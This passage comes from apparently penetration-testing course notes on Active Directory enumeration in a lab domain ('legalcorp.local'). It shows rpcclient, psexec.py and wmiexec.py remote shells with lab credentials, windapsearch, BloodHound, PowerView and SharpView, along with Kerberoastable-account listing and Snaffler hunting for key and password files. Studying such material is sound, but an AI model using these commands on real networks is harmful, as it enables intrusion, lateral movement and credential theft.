Thu Mar 31 15:15:21 2022    IT\n    dr--r--r--                0 Thu Mar 31 15:15:29 2022    Legal\n    dr--r--r--                0 Thu Mar 31 15:15:37 2022    Marketing\n    dr--r--r--                0 Thu Mar 31 15:15:47 2022    Operations\n    dr--r--r--                0 Thu Mar 31 15:15:58 2022    R&amp;D\n    dr--r--r--                0 Thu Mar 31 15:16:10 2022    Temp\n    dr--r--r--                0 Thu Mar 31 15:16:18 2022    Warehouse\n\n    &lt;SNIP&gt;\n</code></pre></p>  rpcclient <p>Using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain): <pre><code>rpcclient -U \"\" -N 172.16.5.5 \n</code></pre></p> rpcclient Enumeration <p>While looking at users in rpcclient, we may notice a field called <code>rid:</code> beside each user. A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:</p> <ul> <li>The SID for the legalcorp.local domain is: <code>S-1-5-21-3842939050-3880317879-2865463114</code>.</li> <li>When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.</li> <li>So the domain user <code>user</code> with a RID:[0x457] Hex 0x457 would = decimal <code>1111</code>, will have a full user SID of: <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code>.</li> <li>This is unique to the <code>user</code> object in the legalcorp.local domain and you will never see this paired value tied to another object in this domain or any other.</li> </ul> <p>However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals <code>500</code>. The built-in Administrator account will always have the RID value <code>Hex 0x1f4</code>, or 500.</p> <pre><code>rpcclient $&gt; queryuser 0x457\n\n        User Name   :   user\n        Full Name   :   xyz Student\n        Home Drive  :\n        Dir Drive   :\n        Profile Path:\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST\n        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST\n        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT\n        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT\n        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT\n        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT\n        unknown_2[0..31]...\n        user_rid :      0x457\n        group_rid:      0x201\n        acb_info :      0x00000010\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x0000001d\n        padding1[0..7]...\n        logon_hrs[0..21]...\n</code></pre> <p>To enumerate all users to gather the RIDs for more than just one, we would use the <code>enumdomusers</code> command</p> <pre><code>rpcclient $&gt; enumdomusers\n\nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[lab_adm] rid:[0x3e9]\nuser:[user] rid:[0x457]\nuser:[avazquez] rid:[0x458]\nuser:[pfalcon] rid:[0x459]\nuser:[fanthony] rid:[0x45a]\nuser:[wdillard] rid:[0x45b]\nuser:[lbradford] rid:[0x45c]\nuser:[sgage] rid:[0x45d]\nuser:[asanchez] rid:[0x45e]\nuser:[dbranch] rid:[0x45f]\nuser:[ccruz] rid:[0x460]\nuser:[njohnson] rid:[0x461]\nuser:[mholliday] rid:[0x462]\n\n&lt;SNIP&gt;  \n</code></pre>  Impacket Toolkit Psexec.py <p>The tool creates a remote service by uploading a randomly-named executable to the <code>ADMIN$</code> share on the target host. It then registers the service via <code>RPC</code> and the <code>Windows Service Control Manager</code>. Once established, communication happens over a named pipe, providing an interactive remote shell as <code>SYSTEM</code> on the victim host.</p> <p>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges. <pre><code>psexec.py legalcorp.local/wley:'transporter@4'@172.16.5.125  \n</code></pre></p> <p>From here, we can perform most any task on this host; anything from further enumeration to persistence and lateral movement. </p> wmiexec.py <p>Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.</p> <pre><code>wmiexec.py legalcorp.local/wley:'transporter@4'@172.16.5.5  \n</code></pre> <p>The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.</p>  Windapsearch <p>Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.</p> <p>Windapsearch - Domain Admins <pre><code>secops@kali[/kali]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@legalcorp.local -p Klmcargo2 --da\n\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+] Found: DC=LEGALCORP,DC=LOCAL\n[+] Attempting bind\n[+] ...success! Binded as: \n[+]  u:LEGALCORP\\forend\n[+] Attempting to enumerate all Domain Admins\n[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL\n[+] Found 28 Domain Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@legalcorp.local\n\ncn: lab_adm\n\ncn: Matthew Morgan\nuserPrincipalName: mmorgan@legalcorp.local\n\n&lt;SNIP&gt;\n</code></pre></p> <p>To identify more potential users, we can run the tool with the <code>-PU</code> flag and check for users with elevated privileges. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.</p> <pre><code>secops@kali[/kali]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@legalcorp.local -p Klmcargo2 -PU\n\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=LEGALCORP,DC=LOCAL\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      u:LEGALCORP\\forend\n[+] Attempting to enumerate all AD privileged users\n[+] Using DN: CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL\n[+]     Found 28 nested users for group Domain Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@legalcorp.local\n\ncn: lab_adm\n\ncn: Angela Dunn\nuserPrincipalName: adunn@legalcorp.local\n\ncn: Matthew Morgan\nuserPrincipalName: mmorgan@legalcorp.local\n\ncn: Dorothy Click\nuserPrincipalName: dclick@legalcorp.local\n\n&lt;SNIP&gt;\n\n[+] Using DN: CN=Enterprise Admins,CN=Users,DC=LEGALCORP,DC=LOCAL\n[+]     Found 3 nested users for group Enterprise Admins:\n\ncn: Administrator\nuserPrincipalName: administrator@legalcorp.local\n\ncn: lab_adm\n\ncn: Sharepoint Admin\nuserPrincipalName: sp-admin@legalcorp.local\n\n&lt;SNIP&gt;\n</code></pre>  Bloodhound.py <p>Once we have domain credentials, we can run the BloodHound.py The tool consists of two parts: the SharpHound collector for use on Windows systems, and the BloodHound.py collector (also referred to as an <code>ingestor</code>) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. We can run various pre-built queries or write custom queries using Cypher language.</p> <pre><code>secops@kali[/kali]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d legalcorp.local -c all \n\nINFO: Found AD domain: legalcorp.local\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01.legalcorp.local\nINFO: Found 1 domains\nINFO: Found 2 domains in the forest\nINFO: Found 564 computers\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01.legalcorp.local\nINFO: Found 2951 users\nINFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.legalcorp.local\nINFO: Found 183 groups\nINFO: Found 2 trusts\nINFO: Starting computer enumeration with 10 workers\n\n&lt;SNIP&gt;\n</code></pre> <p>https://wadcoms.github.io/ - interactive cheat sheet for many tools.</p>","title":"Credentialed Enumeration - Linux"},{"location":"active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_windows/","text":"ActiveDirectory PowerShell Module <p>Discover Modules <pre><code>PS C:\\xyz&gt; Get-Module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...\n</code></pre></p> <p>The ActiveDirectory module is not yet imported. Import it. <pre><code>PS C:\\xyz&gt; Import-Module ActiveDirectory\nPS C:\\xyz&gt; Get-Module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nManifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  \n</code></pre></p> <p>Enumerate some basic information about the domain with Get-ADDomain</p> <pre><code>PS C:\\xyz&gt; Get-ADDomain\n\nAllowedDNSSuffixes                 : {}\nChildDomains                       : {LOGISTICS.legalcorp.local}\nComputersContainer                 : CN=Computers,DC=LEGALCORP,DC=LOCAL\nDeletedObjectsContainer            : CN=Deleted Objects,DC=LEGALCORP,DC=LOCAL\nDistinguishedName                  : DC=LEGALCORP,DC=LOCAL\nDNSRoot                            : legalcorp.local\nDomainControllersContainer         : OU=Domain Controllers,DC=LEGALCORP,DC=LOCAL\nDomainMode                         : Windows2016Domain\nDomainSID                          : S-1-5-21-3842939050-3880317879-2865463114\nForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=LEGALCORP,DC=LOCAL\nForest                             : legalcorp.local\nInfrastructureMaster               : ACADEMY-EA-DC01.legalcorp.local\nLastLogonReplicationInterval       :\nLinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=LEGALCORP,\n                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN\n                                     EFREIGHT,DC=LOCAL}\nLostAndFoundContainer              : CN=LostAndFound,DC=LEGALCORP,DC=LOCAL\nManagedBy                          :\nName                               : LEGALCORP\nNetBIOSName                        : LEGALCORP\nObjectClass                        : domainDNS\nObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a\nParentDomain                       :\nPDCEmulator                        : ACADEMY-EA-DC01.legalcorp.local\nPublicKeyRequiredPasswordRolling   : True\nQuotasContainer                    : CN=NTDS Quotas,DC=LEGALCORP,DC=LOCAL\nReadOnlyReplicaDirectoryServers    : {}\nReplicaDirectoryServers            : {ACADEMY-EA-DC01.legalcorp.local}\nRIDMaster                          : ACADEMY-EA-DC01.legalcorp.local\nSubordinateReferences              : {DC=LOGISTICS,DC=LEGALCORP,DC=LOCAL,\n                                     DC=ForestDnsZones,DC=LEGALCORP,DC=LOCAL,\n                                     DC=DomainDnsZones,DC=LEGALCORP,DC=LOCAL,\n                                     CN=Configuration,DC=LEGALCORP,DC=LOCAL}\nSystemsContainer                   : CN=System,DC=LEGALCORP,DC=LOCAL\nUsersContainer                     : CN=Users,DC=LEGALCORP,DC=LOCAL\n</code></pre> <p>&lt;pGet-ADUser cmdlet. We will be filtering for accounts with the <code>ServicePrincipalName</code> property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.</p> <pre><code>PS C:\\xyz&gt; Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n\nDistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\nEnabled              : True\nGivenName            : Sharepoint\nName                 : adfs\nObjectClass          : user\nObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95\nSamAccountName       : adfs\nServicePrincipalName : {adfsconnect/azure01.legalcorp.local}\nSID                  : S-1-5-21-3842939050-3880317879-2865463114-5244\nSurname              : Admin\nUserPrincipalName    :\n\nDistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\nEnabled              : True\nGivenName            : Jessica\nName                 : BACKUPAGENT\nObjectClass          : user\nObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed\nSamAccountName       : backupagent\nServicePrincipalName : {backupjob/veam001.legalcorp.local}\nSID                  : S-1-5-21-3842939050-3880317879-2865463114-5220\nSurname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9\nUserPrincipalName    :\n\n&lt;SNIP&gt;\n</code></pre> <p>Verify domain trust relationships using Get-ADTrust</p> <pre><code>PS C:\\xyz&gt; Get-ADTrust -Filter *\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LOGISTICS.legalcorp.local,CN=System,DC=LEGALCORP,DC=LOCAL\nForestTransitive        : False\nIntraForest             : True\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LOGISTICS.legalcorp.local\nObjectClass             : trustedDomain\nObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=LEGALCORP,DC=LOCAL\nTarget                  : LOGISTICS.legalcorp.local\nTGTDelegation           : False\nTrustAttributes         : 32\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LEGALLOGISTICS.LOCAL,CN=System,DC=LEGALCORP,DC=LOCAL\nForestTransitive        : True\nIntraForest             : False\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LEGALLOGISTICS.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=LEGALCORP,DC=LOCAL\nTarget                  : LEGALLOGISTICS.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 8\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False  \n</code></pre> <p>This will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. Next, we can gather AD group information using the Get-ADGroup.</p> <pre><code>PS C:\\xyz&gt; Get-ADGroup -Filter * | select name\n\nname\n----\nAdministrators\nUsers\nGuests\nPrint Operators\nBackup Operators\nReplicator\nRemote Desktop Users\nNetwork Configuration Operators\nPerformance Monitor Users\nPerformance Log Users\nDistributed COM Users\nIIS_IUSRS\nCryptographic Operators\nEvent Log Readers\nCertificate Service DCOM Access\nRDS Remote Access Servers\nRDS Endpoint Servers\nRDS Management Servers\nHyper-V Administrators\nAccess Control Assistance Operators\nRemote Management Users\nStorage Replica Administrators\nDomain Computers\nDomain Controllers\nSchema Admins\nEnterprise Admins\nCert Publishers\nDomain Admins\n\n&lt;SNIP&gt;\n</code></pre> <p>We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group:</p> <pre><code>PS C:\\xyz&gt; Get-ADGroup -Identity \"Backup Operators\"\n\nDistinguishedName : CN=Backup Operators,CN=Builtin,DC=LEGALCORP,DC=LOCAL\nGroupCategory     : Security\nGroupScope        : DomainLocal\nName              : Backup Operators\nObjectClass       : group\nObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38\nSamAccountName    : Backup Operators\nSID               : S-1-5-32-551\n</code></pre> <p>Member listing using Get-ADGroupMember</p> <pre><code>PS C:\\xyz&gt; Get-ADGroupMember -Identity \"Backup Operators\"\n\ndistinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\nname              : BACKUPAGENT\nobjectClass       : user\nobjectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed\nSamAccountName    : backupagent\nSID               : S-1-5-21-3842939050-3880317879-2865463114-5220\n</code></pre> <p>We can see that one account, <code>backupagent</code>, belongs to this account. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain.</p> <p>Tools like BloodHound can speed up this process and make our results far more accurate and organized.</p>  <p>Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it.</p>   PowerView <p>PowerView is a tool written in PowerShell to help us gain situational awareness within an AD environment.</p>    Command Description     <code>Export-PowerViewCSV </code> Append results to a CSV file   <code>ConvertTo-SID</code> Convert a User or group name to its SID value   <code>Get-DomainSPNTicket</code> Requests the Kerberos ticket for a specified Service Principal Name (SPN) account   Domain/LDAP Functions:    <code>Get-Domain</code> Will return the AD object for the current (or specified) domain   <code>Get-DomainController</code> Return a list of the Domain Controllers for the specified domain   <code>Get-DomainUser</code> Will return all users or specific user objects in AD   <code>Get-DomainComputer</code> Will return all computers or specific computer objects in AD   <code>Get-DomainGroup</code> Will return all groups or specific group objects in AD   <code>Get-DomainOU</code> Search for all or specific OU objects in AD   <code>Find-InterestingDomainAcl</code> Finds object ACLs in the domain with modification rights set to non-built in objects   <code>Get-DomainGroupMember </code> Will return the members of a specific domain group   <code>Get-DomainFileServer </code> Returns a list of servers likely functioning as file servers   <code>Get-DomainDFSShare</code> Returns a list of all distributed file systems for the current (or specified) domain   GPO Functions:    <code>Get-DomainGPO</code> Will return all GPOs or specific GPO objects in AD   <code>Get-DomainPolicy</code> Returns the default domain policy or the domain controller policy for the current domain   Computer Enumeration Functions:    <code>Get-NetLocalGroup</code> Enumerates local groups on the local or a remote machine   <code>Get-NetLocalGroupMember</code> Enumerates members of a specific local group   <code>Get-NetShare </code> Returns open shares on the local (or a remote) machine   <code>Get-NetSession</code> Will return session information for the local (or a remote) machine   <code>Test-AdminAccess</code> Tests if the current user has administrative access to the local (or a remote) machine   Threaded 'Meta'-Functions:    <code>Find-DomainUserLocation</code> Finds machines where specific users are logged in   <code>Find-DomainShare</code> Finds reachable shares on domain machines   <code>Find-InterestingDomainShareFile</code> Searches for files matching specific criteria on readable shares in the domain   <code>Find-LocalAdminAccess</code> Find machines on the local domain where the current user has local administrator access   Domain Trust Functions:    <code>Get-DomainTrust</code> Returns domain trusts for the current domain or a specified domain   <code>Get-ForestTrust</code> Returns all forest trusts for the current forest or a specified forest   <code>Get-DomainForeignUser</code> Enumerates users who are in groups outside of the user's domain   <code>Get-DomainForeignGroupMember</code> Enumerates groups with users outside of the group's domain and returns each foreign member   <code>Get-DomainTrustMapping</code> Will enumerate all trusts for the current domain and any others seen.    <p>Get-DomainUser will provide us with information on all users or specific users we specify.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -Identity mmorgan -Domain legalcorp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n\nname                 : Matthew Morgan\nsamaccountname       : mmorgan\ndescription          :\nmemberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=Shared Calendar\n                       Read,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=Printer Access,OU=Security\n                       Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=File Share H Drive,OU=Security\n                       Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL...}\nwhencreated          : 10/27/2021 5:37:06 PM\npwdlastset           : 11/18/2021 10:02:57 AM\nlastlogontimestamp   : 2/27/2022 6:34:25 PM\naccountexpires       : NEVER\nadmincount           : 1\nuserprincipalname    : mmorgan@legalcorp.local\nserviceprincipalname :\nmail                 :\nuseraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH\n</code></pre> <p>We can use Get-DomainGroupMember to retrieve group-specific information. Adding the <code>-Recurse</code> switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the <code>Secadmins</code> group is part of the <code>Domain Admins</code> group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.</p> <pre><code>PS C:\\xyz&gt;  Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n\nGroupDomain             : legalcorp.local\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL\nMemberDomain            : legalcorp.local\nMemberName              : svc_qualys\nMemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613\n\nGroupDomain             : legalcorp.local\nGroupName               : Domain Admins\nGroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=LEGALCORP,DC=LOCAL\nMemberDomain            : legalcorp.local\nMemberName              : sp-admin\nMemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228\n\nGroupDomain             : legalcorp.local\nGroupName               : Secadmins\nGroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL\nMemberDomain            : legalcorp.local\nMemberName              : spong1990\nMemberDistinguishedName : CN=Maggie\n                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nMemberObjectClass       : user\nMemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965\n\n&lt;SNIP&gt;  \n</code></pre> <p>Now we know who to target for potential elevation of privileges. We can also enumerate domain trust mappings.</p> <pre><code>PS C:\\xyz&gt; Get-DomainTrustMapping\n\nSourceName      : legalcorp.local\nTargetName      : LOGISTICS.legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : legalcorp.local\nTargetName      : LEGALLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n\nSourceName      : LOGISTICS.legalcorp.local\nTargetName      : legalcorp.local\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM \n</code></pre> <p>We can use Test-AdminAccess to test for local admin access on either the current machine or a remote one.</p> <pre><code>PS C:\\xyz&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n\nComputerName    IsAdmin\n------------    -------\nACADEMY-EA-MS01    True \n</code></pre> <p>We determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01.</p> <p>Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n\nserviceprincipalname                          samaccountname\n--------------------                          --------------\nadfsconnect/azure01.legalcorp.local       adfs\nbackupjob/veam001.legalcorp.local         backupagent\nd0wngrade/kerberoast.legalcorp.local      d0wngrade\nkadmin/changepw                               krbtgt\nMSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433 sqldev\nMSSQLSvc/SPSJDB.legalcorp.local:1433      sqlprod\nMSSQLSvc/SQL-CL01-01legalcorp.local:49351 sqlqa\nsts/legalcorp.local                       solarwindsmonitor\ntestspn/kerberoast.legalcorp.local        testspn\ntestspn2/kerberoast.legalcorp.local       testspn2\n</code></pre>  SharpView <p>Here we can use SharpView to enumerate information about a specific user, such as the user <code>forend</code>, which we control.</p> <pre><code>PS C:\\xyz&gt; .\\SharpView.exe Get-DomainUser -Identity forend\n\n[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL\n[Get-DomainUser] filter string: (&amp;(samAccountType=805306368)(|(samAccountName=forend)))\nobjectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}\nsamaccounttype                 : USER_OBJECT\nobjectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b\nuseraccountcontrol             : NORMAL_ACCOUNT\naccountexpires                 : 12/31/1600 4:00:00 PM\nlastlogon                      : 4/18/2022 1:01:21 PM\nlastlogontimestamp             : 4/9/2022 1:33:21 PM\npwdlastset                     : 2/28/2022 12:03:45 PM\nlastlogoff                     : 12/31/1600 4:00:00 PM\nbadPasswordTime                : 4/5/2022 7:09:07 AM\nname                           : forend\ndistinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=LEGALCORP,DC=LOCAL\nwhencreated                    : 2/28/2022 8:03:45 PM\nwhenchanged                    : 4/9/2022 8:33:21 PM\nsamaccountname                 : forend\nmemberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=LEGALCORP,DC=LOCAL}\ncn                             : {forend}\nobjectclass                    : {top, person, organizationalPerson, user}\nbadpwdcount                    : 0\ncountrycode                    : 0\nusnchanged                     : 3259288\nlogoncount                     : 26618\nprimarygroupid                 : 513\nobjectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=LEGALCORP,DC=LOCAL\ndscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}\nusncreated                     : 3054181\ninstancetype                   : 4\ncodepage                       : 0\n</code></pre> <p>SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.</p>  Snaffler <p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p> <pre><code>Snaffler.exe -s -d legalcorp.local -o snaffler.log -v data\n</code></pre> <pre><code>PS C:\\xyz&gt; .\\Snaffler.exe  -d legalcorp.local -s -v data\n\n .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..\n;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;\n'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['\n  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$\"\"   $$$$$$c\n 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,\n  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'\n                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler\n\n2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.legalcorp.local\\ADMIN$)\n2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.legalcorp.local\\C$)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-MX01.legalcorp.local\\address)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.legalcorp.local\\User Shares)\n2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.legalcorp.local\\ZZZ_archive)\n2022-03-31 12:17:18 -07:00 [Share] {Green}(\\\\ACADEMY-EA-CA01.legalcorp.local\\CertEnroll)\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.kdb$|289B|3/31/2022 12:09:22 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\GroupBackup.kdb) .kdb\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|299B|3/31/2022 12:05:33 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\ShowReset.key) .key\n2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.legalcorp.local\\UpdateServicesPackages)\n2022-03-31 12:17:19 -07:00 [File] {Black}&lt;KeepExtExactBlack|R|^\\.kwallet$|302B|3/31/2022 12:04:45 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\WriteUse.kwallet) .kwallet\n2022-03-31 12:17:19 -07:00 [File] {Red}&lt;KeepExtExactRed|R|^\\.key$|298B|3/31/2022 12:05:10 PM&gt;(\\\\ACADEMY-EA-DC01.legalcorp.local\\Department Shares\\IT\\Infosec\\ProtectStep.key) 